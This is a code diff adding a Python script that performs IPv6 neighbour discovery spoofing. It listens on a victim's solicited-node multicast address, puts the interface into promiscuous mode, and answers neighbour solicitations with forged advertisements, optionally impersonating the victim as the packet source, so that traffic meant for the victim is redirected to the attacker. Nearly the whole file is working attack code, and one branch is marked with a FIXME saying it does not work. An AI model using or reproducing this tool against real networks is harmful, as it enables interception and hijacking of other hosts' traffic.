@@ -1,0 +1,166 @@
+#!/usr/bin/python3
+
+import argparse
+import fcntl
+import ipaddress
+import socket
+import struct
+from collections import deque
+
+
+def compute_icmp_checksum(src: ipaddress.IPv6Address,
+                          dst: ipaddress.IPv6Address,
+                          payload: bytes) -> int:
+    pseudo_header = struct.pack('>16s16sI3xB',
+                                src.packed,
+                                dst.packed,
+                                len(payload),
+                                socket.getprotobyname('ipv6-icmp'))
+    packet = pseudo_header + payload
+
+    total = 0
+
+    # Add up 16-bit words
+    for i in range(len(packet) // 2):
+        total += (packet[2 * i] << 8) + packet[2 * i + 1]
+
+    # Add any left over byte
+    if len(packet) % 2:
+        total += packet[-1] << 8
+
+    # Fold 32-bits into 16-bits
+    total = (total >> 16) + (total & 0xffff)
+    total += total >> 16
+    return (~total + 0x10000 & 0xffff)
+
+
+def get_local_addresses(interface: str) -> list[ipaddress.IPv6Address]:
+    iface_index = socket.if_nametoindex(interface)
+
+    results = [ipaddress.IPv6Address('::')]
+
+    for destination in ['fe80::', 'cafe::']:
+        sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+        sock.connect((destination, 0, 0, iface_index))
+        results.append(ipaddress.IPv6Address(sock.getsockname()[0]))
+
+    return results
+
+
+def handle_neighbour_solicitation(source: ipaddress.IPv6Address,
+                                  packet: bytes,
+                                  local_address: ipaddress.IPv6Address,
+                                  interface: str,
+                                  impersonate: bool) -> None:
+    if len(packet) < 24:
+        print("Ignoring neighbour solicitation of length '{}' from '{}'.".format(len(packet), source))
+        return
+
+    sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    result = fcntl.ioctl(sock.fileno(),
+                         0x8927,  # SIOCGIFHWADDR
+                         struct.pack('@16s8x', interface.encode('ascii')[:15]))
+    _, hwaddr = struct.unpack_from('@16xH6s', result)
+
+    possible_victim = ipaddress.IPv6Address(packet[8:24])
+    response_source = possible_victim if impersonate else local_address
+    print("Responding to target '{}' for victim '{}' from '{}'.".format(source, possible_victim, response_source))
+
+    response_options = b''
+
+    options = packet[24:]
+    while len(options) >= 8:
+        type, length = struct.unpack('>BB', options[:2])
+        if length == 0:
+            break
+        if type == 1 and length == 1:  # source link-address
+            # Add destination link-address option.
+            response_options += struct.pack('>BB6s', 2, 1, hwaddr)
+        options = options[length * 8:]
+
+    payload = struct.pack('>BBHB3x16s',
+                          136,      # icmp-type: ND advertisement
+                          0,        # code: 0
+                          0,        # checksum
+                          0x60,     # flags: solicited | override
+                          possible_victim.packed)
+    payload += response_options
+
+    header = struct.pack('>B3xHBB16s16s',
+                         6 << 4,                                # version
+                         len(payload),                          # payload length
+                         socket.getprotobyname('ipv6-icmp'),    # next header
+                         255,                                   # hop limit
+                         response_source.packed,                # source address
+                         source.packed)                         # dest address
+
+    checksum = compute_icmp_checksum(response_source, source, payload)
+    payload = payload[:2] + struct.pack('>H', checksum) + payload[4:]
+
+    try:
+        sock.sendto(header + payload, (str(source), 0, 0, socket.if_nametoindex(interface)))
+    except OSError as e:
+        print("Failed to send neighbour advertisement: {}.".format(e.strerror))
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('interface', metavar='INTERFACE', help="The name of the interface to listen for neighbour solicitations for.")
+    parser.add_argument('victim', type=ipaddress.IPv6Address, metavar='VICTIM-ADDRESS', help="A partial IPv6 address to listen for neighbour solicitations on; only the last 24 bits are used.")
+    parser.add_argument('-i', '--impersonate', action='store_true', default=False, help="Whether to impersonate the victim by using its address as the source in the IPv6 header (and not just in the neighbour advertisement target field).")
+    args = parser.parse_args()
+
+    local_addresses = deque(get_local_addresses(args.interface))
+
+    # Create socket and join solicited-node multicast address of victim.
+    iface_index = socket.if_nametoindex(args.interface)
+    sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
+    # sock.setsockopt(socket.IPPROTO_IPV6, 75, 1)  # IPV6_TRANSPARENT
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, args.interface.encode('ascii'))
+    sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_RECVPKTINFO, 1)
+    victim_sn_mcast_address = ipaddress.IPv6Address('ff02::1:ff00:0') + int.from_bytes(args.victim.packed[-3:], byteorder='big')
+    mreq = struct.pack('@16sI', victim_sn_mcast_address.packed, iface_index)
+    sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
+    result = fcntl.ioctl(sock.fileno(),
+                         0x8913,  # SIOCGIFFLAGS
+                         struct.pack('@16s8x', args.interface.encode('ascii')[:15]))
+    original_flags, = struct.unpack_from('@H', result, offset=16)
+    fcntl.ioctl(sock.fileno(),
+                0x8914,  # SIOCSIFFLAGS
+                struct.pack('@16sH',
+                            args.interface.encode('ascii')[:15],
+                            original_flags | (1 << 8)))  # IFF_PROMISC
+    # sock.bind(('::', 0, 0, iface_index))
+
+    try:
+        while True:
+            data, cmsg_list, flags, source = sock.recvmsg(4096, 4096)
+            source_address = ipaddress.IPv6Address(source[0])
+
+            destination_address = None
+            for level, type, cmsg_data in cmsg_list:
+                if level == socket.IPPROTO_IPV6 and type == socket.IPV6_PKTINFO:
+                    destination_address = ipaddress.IPv6Address(cmsg_data[:16])
+
+            if len(data) < 4:
+                continue
+            type, code = struct.unpack('>BB', data[:2])
+
+            print(type)
+            if type == 128 and code == 0:
+                if destination_address is None or destination_address.packed[-3:] != args.victim.packed[-3:]:
+                    continue
+                # FIXME: this doesn't actually work.
+                print("Fooled '{}' into sending us packets destined for '{}'.".format(source_address, destination_address))
+            elif type == 135 and code == 0:
+                if destination_address is None or destination_address.packed[-3:] != args.victim.packed[-3:]:
+                    continue
+                local_address = local_addresses[0]
+                local_addresses.rotate()
+                handle_neighbour_solicitation(source_address, data, local_address, args.interface, args.impersonate)
+    finally:
+        fcntl.ioctl(sock.fileno(),
+                    0x8914,  # SIOCSIFFLAGS
+                    struct.pack('@16sH',
+                                args.interface.encode('ascii')[:15],
+                                original_flags))
